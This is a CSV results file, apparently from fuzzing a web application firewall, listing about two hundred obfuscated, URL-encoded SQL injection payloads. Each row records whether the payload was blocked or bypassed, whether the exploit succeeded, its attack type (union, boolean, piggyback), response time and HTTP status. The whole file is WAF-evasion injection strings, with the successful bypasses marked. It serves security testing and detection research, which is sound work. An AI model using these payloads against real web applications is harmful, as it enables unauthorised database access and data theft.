Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=1.+or+not~false=+(not+{a+1}=1)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0125,72.71,No,200
0%27<@!=1%0b||+not%0b{`if`%0b1}=1=+(not+{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0103,72.71,No,500
0%27<@!=1.%0b||+not+{x+(select%0b1)}=1=+(not%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0089,72.71,No,200
0%27<@!=1.+or%0b!%0b{x%0b(select+1)}=1=%0b(!~false)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0128,72.71,No,200
0%27<@=1+or+!+{`if`+1}=1=+(not%0b{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0162,72.71,No,500
0'<@!=.1%0b||%0bnot%0b{a+1}=1=+(not~false)+||%27,Bypassed,No,None,Unknown,0.0217,72.71,No,500
0%27<@!=.1%0b||%0b{x+(select+1)}=1+like%0b{x%0b(select%0b1)}=1%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.019,72.71,No,200
0'<@!=.1+||%0bnot~0=+(not%0b{`if`%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.0134,72.71,No,500
0%27<@!=.1+||%0bnot%7e0=%0b(not%7efalse)+or',Bypassed,No,None,booleanAtk,0.0143,72.71,No,500
0'<@=1.+or%0b!+{a+1}=1=%0b(!%0b1)%0b||',Bypassed,No,None,Unknown,0.0248,72.71,No,500
0'<@!=1%0b||+not+{a%0b1}=1=+(!~0)+||',Bypassed,No,None,Unknown,0.0132,72.71,No,500
0'<@!=1.+||+!+{x%0b(select+1)}=1=+(not+{`if`+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0235,72.71,No,500
0'<@!=1.+or%0bnot%0btrue=+(not%0b{x+(select+1)}=1)%0b||',Blocked,No,None,booleanAtk,0.0097,72.71,No,403
0%27<@=.1%0bor+not~false=+(not+{`if`%0b1}=1)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0186,72.74,No,200
0'<@!=1+||+{x%0b(select+1)}=1+like%0b{x+(select%0b1)}=1+||%27,Blocked,No,None,Unknown,0.0128,72.78,No,403
0%27<@=1.+or%0bnot%0b1=+(!+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0196,72.71,No,500
0%27<@=1.%0b||+!+{x%0b(select+1)}=1=+(0)%0b||',Bypassed,No,None,Unknown,0.0167,72.71,No,500
0%27<@!=1.+or+not+{x%0b(select%0b1)}=1=+(not+true)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0312,72.71,No,200
0'<@=1.%0bor+not+true=+(not+{x%0b(select%0b1)}=1)+||%27,Bypassed,No,None,booleanAtk,0.019,72.71,No,500
0%27<@!=1.+or+not%0b{`if`%0b1}=1=%0b(!+1)+||',Bypassed,No,None,Unknown,0.023,72.71,No,500
0'<@=.1%0bor%0b1%0blike+{`if`+1}=1+||',Bypassed,No,None,Unknown,0.025,72.71,No,500
0'<@=1+||+not%0b{`if`+1}=1=%0b(not%0b{a%0b1}=1)--+,Bypassed,No,None,piggyAtk,0.0217,72.74,No,500
0'<@!=.1+or+not+1=%0b(!%0b{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0132,72.78,No,500
0%27<@!=1+or%0bnot~0=%0b(not~false)%0b||',Bypassed,No,None,booleanAtk,0.0186,72.78,No,500
0%27<@=1%0bor%0b0=+(not%0b{`if`+1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0094,72.78,No,200
0'<@!=.1%0bor%0bnot+{x+(select%0b1)}=1=+(!%7efalse)%0bor%27,Bypassed,No,None,booleanAtk,0.0182,72.78,No,500
0%27<@=.1+or%0bnot+{x%0b(select%0b1)}=1=+(not+{x%0b(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0229,72.78,No,200
0'<@=1%0b||%0b!+{x%0b(select+1)}=1=%0b(not%0b{a+1}=1)+||',Bypassed,No,None,Unknown,0.0178,72.78,No,500
0'<@!=.1%0b||+not+{`if`%0b1}=1=+(not+{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0081,72.78,No,500
0%27<@!=1.%0b||+!%0b{`if`%0b1}=1=%0b(!+{x+(select+1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0125,72.78,No,200
0'<@=1+||+not%0b1=%0b(not+{x+(select+1)}=1)+||',Blocked,No,None,Unknown,0.0222,72.78,No,403
0%27or%0b@<@.%0bor+!%0b{`if`+1}=1=+(!%0b{x+(select%0b1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0173,72.78,No,200
0%27<@!=1.%0bor%0bnot%0b{x%0b(select+1)}=1=+(not~0)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0338,72.78,No,200
0'<@!=.1%0bor%0b!%7efalse=+(!+{`if`+1}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.0193,72.78,No,500
0'<@!=1.%0bor+not+{x%0b(select+1)}=1=%0b(!+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0217,72.78,No,500
0'<@!=.1+or%0b!%0b{`if`+1}=1=%0b(!+true)--+,Bypassed,No,None,piggyAtk,0.0263,72.78,No,500
0%27<@!=1.%0bor+{`if`+1}=1+like+{x+(select+1)}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0269,72.78,No,200
0'<@!=.1+||+not+{`if`%0b1}=1=+(not%0b{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0129,72.78,No,500
0%27<@=1.+||+not+{a%0b1}=1=%0b(!%0b{x%0b(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0179,72.78,No,200
0%27<@=1+or%0bnot%0b{`if`+1}=1=%0b(!+{x+(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0214,72.78,No,200
0'<@=.1+||%0b!+{a+1}=1=+(!%0b{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0209,72.78,No,500
0%27<@!=1.+or%0b{`if`%0b1}=1+like+true+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0181,72.78,No,200
0%27<@=1+||%0bnot+true=%0b(not+{x+(select+1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0204,72.78,No,200
0'<@=1.+or%0bnot+{x%0b(select%0b1)}=1=+(!%0b{`if`+1}=1)%23,Bypassed,No,None,piggyAtk,0.0224,72.78,No,500
0'<@=.1+or+!+{x+(select%0b1)}=1=%0b(not%7efalse)%0bor%27,Blocked,No,None,booleanAtk,0.0129,72.78,No,403
0'<@=1+or+not%7efalse=%0b(not+{a%0b1}=1)%0b||',Bypassed,No,None,booleanAtk,0.0159,72.78,No,500
0%27<@=1.%0b||+{x+(select%0b1)}=1%0blike%0btrue+||%27,Bypassed,Yes,unionAtk,Unknown,0.0233,72.78,No,200
0'<@!=1+||%0b!+{x+(select%0b1)}=1=%0b(not%0b{`if`+1}=1)%0bor',Blocked,No,None,Unknown,0.0051,72.78,No,403
0'<@=1+or%0b!+{a%0b1}=1=+(!+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0236,72.78,No,500
0%27<@!=1%0bor%0bnot%7efalse=+(!%0b{x%0b(select%0b1)}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0196,72.78,No,200
0%27<@=1+||%0b!%0b{x%0b(select+1)}=1=+(not+1)+||',Bypassed,No,None,Unknown,0.0173,72.78,No,500
0'<@!=.1+or%0b!%0b{`if`+1}=1=+(0)%0b||',Bypassed,No,None,Unknown,0.018,72.78,No,500
0%27<@!=.1+||%0bnot%0b{x+(select+1)}=1=%0b(not%0b{`if`%0b1}=1)--%0b,Blocked,No,None,piggyAtk,0.0161,72.78,No,403
0'<@=.1%0b||%0bnot+{x%0b(select%0b1)}=1=+(not+{a+1}=1)+||',Bypassed,No,None,Unknown,0.0261,72.78,No,500
0%27<@=1.%0bor+!%0b{a%0b1}=1=%0b(!%0b{x%0b(select%0b1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0251,72.78,No,200
0'<@!=.1%0bor+!+{a+1}=1=+(!%0b{`if`+1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0129,72.78,No,500
0%27<@=.1%0b||%0b!%0b{a+1}=1=+(not%0b{a+1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0142,72.78,No,200
0%27<@!=1.%0b||+!%0b{`if`+1}=1=+(not+{x+(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0144,72.78,No,200
0%27<@!=1+or%0bnot%0b{x+(select%0b1)}=1=%0b(not+{x+(select%0b1)}=1)+or%27,Blocked,No,None,Unknown,0.0092,72.78,No,403
0'<@!=1.%0bor+not%0b{`if`+1}=1%0bis+false%0bor',Bypassed,No,None,booleanAtk,0.0232,72.78,No,500
0%27<@=.1+||%0b!+{a+1}=1=%0b(not+{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0188,72.78,No,500
0%27<@=.1+or+not+{`if`%0b1}=1=%0b(!%0b{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0114,72.78,No,500
0%27<@!=1+or%0btrue%0blike+1%0bor',Bypassed,No,None,booleanAtk,0.0161,72.78,No,500
0'or+@<@.+or+{x%0b(select%0b1)}=1%0blike+{x+(select+1)}=1%0bor%27,Bypassed,No,None,Unknown,0.015,72.78,No,500
0'<@=1+||%0bnot%0b1=%0b(!+{`if`+1}=1)--+,Bypassed,No,None,piggyAtk,0.0179,72.78,No,500
0%27<@=.1%0bor%0bnot+{a%0b1}=1=%0b(not%0b{x+(select%0b1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0157,72.71,No,200
0'<@!=1.+or%0bnot%0b{x+(select+1)}=1=+(!+{x+(select%0b1)}=1)--+,Blocked,No,None,piggyAtk,0.0207,72.71,No,403
0'<@=1+or+!+{a+1}=1=%0b(!+{x+(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0153,72.71,No,500
0%27<@=1.+||%0b!+{x+(select%0b1)}=1=+(not%0b{x%0b(select+1)}=1)%0bor%27,Blocked,No,None,Unknown,0.0169,72.71,No,403
0%27<@!=.1%0b||%0bnot%0b{x%0b(select+1)}=1=+(!+{`if`+1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0339,72.71,No,200
0'<@!=1.+or%0bnot%0b{x%0b(select%0b1)}=1=+(not%0b{x+(select%0b1)}=1)%0bor',Blocked,No,None,Unknown,0.0045,72.71,No,403
0%27<@=.1+||%0bnot%7efalse=%0b(!+{x%0b(select%0b1)}=1)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0225,72.78,No,200
0'<@!=1.+or%0b!~false=+(!%0b{`if`+1}=1)%23,Bypassed,No,None,piggyAtk,0.0118,72.78,No,500
0%27<@!=.1%0bor%0b!%0b{x+(select%0b1)}=1=%0b(not+{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.03,72.78,No,500
0%27||+!@<@.%0b||%0b{x+(select%0b1)}=1+like+{`if`+1}=1%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0221,72.78,No,200
0%27<@=1%0b||%0bnot+true=%0b(!%0b{x+(select%0b1)}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0179,72.78,No,200
0%27<@=1.+or+!+{x%0b(select+1)}=1=+(!+{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0156,72.78,No,500
0'<@=1%0bor%0b!+{`if`+1}=1=%0b(not+{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0188,72.78,No,500
0'<@=.1+or+!%0b{x+(select+1)}=1=+(not+true)+||',Bypassed,No,None,booleanAtk,0.0164,72.78,No,500
0'<@!=.1+or+!+{x+(select%0b1)}=1=+(not+{x+(select+1)}=1)%0bor',Blocked,No,None,Unknown,0.0109,72.78,No,403
0'||%0b@<@.+or+not+{a+1}=1=+(!+{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0178,72.78,No,500
0'<@!=1.+||+!+{`if`%0b1}=1=+(!%0b{x+(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0238,72.78,No,500
0%27<@!=1+||%0b{a%0b1}=1%0blike%0b{a+1}=1+||',Bypassed,No,None,Unknown,0.0153,72.78,No,500
0%27<@=.1+or%0b!+{x+(select+1)}=1=%0b(!+{x+(select%0b1)}=1)%23,Blocked,No,None,piggyAtk,0.0181,72.78,No,403
0%27<@!=.1+or+!+{`if`+1}=1=%0b(not%0b{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0118,72.78,No,500
0'<@=.1+||+!+{a+1}=1=%0b(!%7efalse)%23,Bypassed,No,None,piggyAtk,0.0261,72.78,No,500
0'<@!=1+||+!+{a%0b1}=1=%0b(not+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.0257,72.78,No,500
0%27<@!=1+or%0b!%0b{x+(select%0b1)}=1=%0b(!+{`if`+1}=1)+or',Blocked,No,None,Unknown,0.0142,72.78,No,403
0'<@!=.1+||+not+{x+(select%0b1)}=1=+(!%0b{x+(select+1)}=1)+or',Blocked,No,None,Unknown,0.0186,72.78,No,403
0%27<@=.1+||+!%0b{x+(select%0b1)}=1=+(not+{x+(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0198,72.78,No,200
0%27<@!=1%0b||+not%0b1=+(!%0b{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0179,72.78,No,500
0%27||+@<@+or+!+{x+(select+1)}=1=%0b(!+1)+||',Blocked,No,None,Unknown,0.0229,72.78,No,403
0'<@=.1+or%0b0=%0b(not%0b{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0326,72.78,No,500
0'<@=.1+||%0bnot+{a%0b1}=1=%0b(!%0b{x%0b(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.015,72.78,No,500
0'<@!=1+||%0b!%0btrue=+(not+{x+(select+1)}=1)%0bor',Blocked,No,None,booleanAtk,0.0082,72.78,No,403
0%27<@!=.1%0bor%0bnot+{x%0b(select+1)}=1=+(not%0b{x+(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0111,72.78,No,200
0'<@!=.1+||%0bnot+{a%0b1}=1=+(!%0b{a+1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0128,72.78,No,500
0%27<@=1.+||%0bnot+{x%0b(select+1)}=1=+(not+{x+(select%0b1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0319,72.78,No,200
0'<@!=.1%0bor%0bnot+{a%0b1}=1=+(not+{x+(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.0183,72.78,No,500
0%27<@!=1.%0b||+not%0b{a+1}=1=%0b(!+{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0144,72.78,No,500
0'<@=1.%0b||%0b!%0b{`if`%0b1}=1=+(!+{a+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0064,72.78,No,500
0%27or+1<@+or+true%0blike%0b1+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.016,72.78,No,200
0%27<@=1+or+!%0b{`if`+1}=1=+(false)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0141,72.78,No,200
0%27<@!=1.+or+!%0b{x+(select+1)}=1=+(!+true)+or',Bypassed,No,None,booleanAtk,0.0257,72.78,No,500
0%27<@!=1.%0b||+!~false=+(not+{`if`+1}=1)%0bor',Bypassed,No,None,booleanAtk,0.0208,72.78,No,500
0%27<@!=1+||%0b!+true=+(not%0b{`if`+1}=1)+or',Bypassed,No,None,booleanAtk,0.0155,72.78,No,500
0%27or+@<@.%0bor%0b!%0b{x%0b(select%0b1)}=1=%0b(!+{x%0b(select%0b1)}=1)+or,Bypassed,Yes,unionAtk,Unknown,0.0105,72.78,No,200
0'<@!=1.+or+not~false=%0b(0)%0bor%27,Bypassed,No,None,booleanAtk,0.0205,72.78,No,500
0%27<@!=.1%0bor+!+{x%0b(select+1)}=1=+(not%0b{`if`+1}=1)%0bor',Bypassed,No,None,Unknown,0.0135,72.78,No,500
0'<@!=1+or+!+{x+(select+1)}=1=+(not%0b{`if`+1}=1)%0b||%27,Blocked,No,None,Unknown,0.0104,72.78,No,403
0'<@!=.1+||+false=+(!%0btrue)%0b||%27,Bypassed,No,None,Unknown,0.0108,72.78,No,500
0%27<@=1+||%0bnot+{a+1}=1=+(not+{x+(select+1)}=1)+or%27,Blocked,No,None,Unknown,0.0091,72.78,No,403
0%27<@=.1%0b||+not%0b{a+1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0192,72.78,No,200
0%27<@=1.+or+not%0btrue=+(not%0b1)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0135,72.78,No,200
0%27<@!=1+or%0bnot+{x+(select+1)}=1=+(!%0b{`if`+1}=1)%0bor%27,Blocked,No,None,Unknown,0.0194,72.78,No,403
0%27<@=1%0b||%0b!%0b{x+(select+1)}=1=+(!%0b{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0144,72.71,No,500
0%27<@!=1%0b||+not+{x+(select%0b1)}=1=%0b(!%0b{x+(select+1)}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0205,72.71,No,200
0'<@!=1%0bor+!+{x+(select%0b1)}=1=+(not%0b{`if`+1}=1)+||%27,Bypassed,No,None,Unknown,0.0137,72.71,No,500
0%27<@!=.1%0bor+not%0b{x+(select%0b1)}=1=+(not%0b{a+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.015,72.78,No,200
0%27<@!=1.+||%0bnot%0b{x+(select+1)}=1=%0b(!%0b{a+1}=1)--%0b,Blocked,No,None,piggyAtk,0.0158,72.78,No,403
0%27or+@<@.%0bor%0bnot+{a%0b1}=1=+(!%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0285,72.78,No,200
0%27<@=.1+or%0b{a+1}=1+like%0b{x+(select%0b1)}=1+or',Bypassed,No,None,Unknown,0.0155,72.78,No,500
0%27<@=.1+or+not~0=%0b(!%0b{`if`%0b1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0136,72.78,No,200
0'<@!=1.+or+not+{x+(select+1)}=1=+(false)--+,Blocked,No,None,piggyAtk,0.015,72.78,No,403
0'<@=.1+or+!%0b{`if`+1}=1=+(!+{`if`+1}=1)+or%27,Bypassed,No,None,Unknown,0.0242,72.78,No,500
0%27<@!=1%0b||%0bnot+{a%0b1}=1=+(not+1)%0bor',Bypassed,No,None,Unknown,0.0193,72.78,No,500
0%27<@!=1.+or+!+{x%0b(select+1)}=1=+(not%0b{a%0b1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0164,72.78,No,200
0%27<@=1+or+not%0b{`if`+1}=1=+(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0256,72.78,No,500
0'<@!=1.%0b||+not%0b{x%0b(select%0b1)}=1=+(not+{x+(select%0b1)}=1)+||%27,Bypassed,No,None,Unknown,0.0422,72.78,No,500
0'<@!=1.%0b||+not+{x+(select+1)}=1=+(not+{x+(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0115,72.78,No,500
0'<@=1.+||%0b!+{`if`+1}=1=+(!+{a%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0205,72.78,No,500
0%27<@!=1+or%0b!+{`if`+1}=1=%0b(!+{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.02,72.78,No,500
0%27<@=1+or%0b!%0b{x+(select+1)}=1=%0b(!%0b{x%0b(select%0b1)}=1)+or',Blocked,No,None,Unknown,0.0032,72.78,No,403
0'<@!=1.%0b||+!%0b{a+1}=1=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0189,72.78,No,500
0'<@=1.%0bor+!+true=%0b(0)+||%27,Bypassed,No,None,booleanAtk,0.0203,72.78,No,500
0'<@=1.+or+!%0b{x+(select%0b1)}=1=+(not~false)+or%27,Bypassed,No,None,booleanAtk,0.012,72.78,No,500
0%27<@!=.1+||%0bnot%0b{`if`+1}=1=%0b(!%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0174,72.78,No,500
0%27<@!=1%0b||%0bnot+{x+(select%0b1)}=1=+(not+{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0175,72.78,No,500
0%27<@!=.1+||%0bnot+{x+(select+1)}=1=+(not%0b{x+(select%0b1)}=1)+or',Blocked,No,None,Unknown,0.0136,72.78,No,403
0%27<@=1+||%0bnot%0b{`if`%0b1}=1=+(!+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0184,72.78,No,500
0%27<@=.1+or%0b!+{a%0b1}=1=+(!%0b{x%0b(select%0b1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0144,72.78,No,200
0'<@!=1.%0bor%0bnot+{x%0b(select%0b1)}=1=+(!%0b{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0271,72.78,No,500
0'<@=.1%0b||%0bnot%0b{x+(select%0b1)}=1=%0b(!+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0154,72.78,No,500
0'<@=.1+||+not+{`if`%0b1}=1=+(!+{`if`%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.013,72.78,No,500
0%27<@=1.+||+!%0b{x+(select+1)}=1=%0b(not+1)+||',Bypassed,No,None,Unknown,0.0155,72.78,No,500
0'<@=.1+||%0b!+{a+1}=1=+(!%0b1)--%0b,Bypassed,No,None,piggyAtk,0.0234,72.78,No,500
0%27<@=1.%0b||%0b!%0b{`if`+1}=1=+(not+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0206,72.78,No,500
0'<@=1+||+!+1=+(not+1)--%0b,Blocked,No,None,piggyAtk,0.0236,72.78,No,403
0'<@!=.1+or+not%0b1=%0b(!%0b{x%0b(select%0b1)}=1)--+,Bypassed,No,None,piggyAtk,0.0176,72.78,No,500
0'<@=1+or+not%0b{x+(select%0b1)}=1=+(!%0b{a%0b1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0099,72.78,No,500
0%27<@!=1%0bor+false=%0b(!%0b{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0249,72.78,No,200
0'<@!=.1+||+not%0b1+is+false%0b||%27,Bypassed,No,None,Unknown,0.0147,72.78,No,500
0%27<@=1.%0bor%0b!%0b{`if`+1}=1=%0b(!%7e0)+||',Bypassed,No,None,Unknown,0.0141,72.78,No,500
0'<@!=1%0bor+!~false=+(not+{`if`+1}=1)+||',Bypassed,No,None,booleanAtk,0.01,72.78,No,500
0%27<@=.1%0b||+{x%0b(select+1)}=1+like%0b{x+(select+1)}=1+||',Bypassed,No,None,Unknown,0.0145,72.78,No,500
0'<@!=.1+||%0b!+true=+(!+{x+(select%0b1)}=1)%0bor',Blocked,No,None,booleanAtk,0.0073,72.78,No,403
0%27<@!=1%0b||%0bnot+{a+1}=1=+(not+{a%0b1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0146,72.78,No,200
0'<@!=1+or+not%0b{a+1}=1=%0b(not+1)%0bor%27,Blocked,No,None,Unknown,0.0069,72.78,No,403
0'<@=1%0b||+!+{x%0b(select+1)}=1=+(not+{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0158,72.78,No,500
0%27or%0b@<@.+or+not+{x+(select%0b1)}=1=+(!+{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0175,72.78,No,500
0'<@!=1+or+not+{x%0b(select%0b1)}=1=+(not+1)+or%27,Bypassed,No,None,Unknown,0.0168,72.78,No,500
0%27<@!=1.%0bor+!+{x+(select%0b1)}=1=+(!+{x%0b(select+1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0131,72.78,No,200
0'<@=1.+||+not%0b{x%0b(select+1)}=1=%0b(!+{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0092,72.78,No,500
0%27<@!=1%0bor%0b!%0b{x%0b(select+1)}=1=%0b(not%0b{x+(select%0b1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0206,72.78,No,200
0'<@=.1+||%0bnot%0b{x+(select%0b1)}=1=+(not+{x+(select+1)}=1)+or%27,Blocked,No,None,Unknown,0.0095,72.78,No,403
0%27<@=1.+||+!+{x+(select%0b1)}=1=+(not+{a%0b1}=1)+or',Blocked,No,None,Unknown,0.0094,72.74,No,403
0'<@=1.%0b||+!%0b{a+1}=1=%0b(not%7e0)+||',Bypassed,No,None,Unknown,0.0181,72.78,No,500
0'<@=1%0bor+not%0b{x+(select+1)}=1=+(!+1)%23,Bypassed,No,None,piggyAtk,0.0218,72.78,No,500
0%27<@!=1%0bor%0bnot~false=+(not~0)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0335,72.78,No,200
0%27<@=.1%0b||+!+{x+(select+1)}=1=+(not%0b1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0183,72.78,No,200
0'<@!=1.+||%0bnot%0b{`if`+1}=1=%0b(not%0b{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0273,72.78,No,500
0%27<@!=1+||%0bnot+{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)+or',Blocked,No,None,Unknown,0.0149,72.78,No,403
0%27<@=1.%0bor+1%0blike%0b{x%0b(select+1)}=1%0b||',Bypassed,No,None,Unknown,0.0158,72.78,No,500
0%27<@=.1%0bor+!+{x+(select%0b1)}=1=+(not%0b{a+1}=1)+or',Bypassed,No,None,Unknown,0.0193,72.78,No,500
0%27<@!=1.+or%0b!%0btrue=+(not+{a+1}=1)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0203,72.78,No,200
0%27<@!=.1%0b||+not+{x+(select+1)}=1=%0b(not+{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0197,72.78,No,500
0'<@!=1.%0bor+{a+1}=1%0blike%0b1+or',Bypassed,No,None,Unknown,0.0215,72.78,No,500
0%27<@=.1+||+!+{a%0b1}=1=%0b(not%0btrue)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0115,72.78,No,200
0%27<@=1%0bor%0b{a+1}=1+like+{x%0b(select%0b1)}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0131,72.78,No,200
0%27<@!=.1+||+false=+(!+{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0288,72.78,No,200
0'<@=.1%0bor%0bnot~false=+(not+{x%0b(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.0225,72.78,No,500
0%27<@!=1+||+!+{`if`%0b1}=1=+(not%0b{x%0b(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0239,72.78,No,200
0%27<@=.1+or+not%0b{a+1}=1=+(not+true)--%0b,Blocked,No,None,piggyAtk,0.0039,72.78,No,403
0%27<@=.1+||+not+{`if`+1}=1=+(!+{x+(select%0b1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0192,72.78,No,200
0'<@=.1+or+not%0b{a%0b1}=1=+(not+{x%0b(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0167,72.78,No,500
0'<@!=1+||%0b!%0b{`if`+1}=1=+(not+{a+1}=1)+||',Bypassed,No,None,Unknown,0.0135,72.78,No,500
0%27<@=1%0bor+not+{x%0b(select%0b1)}=1=+(!%0b{`if`%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0273,72.78,No,200
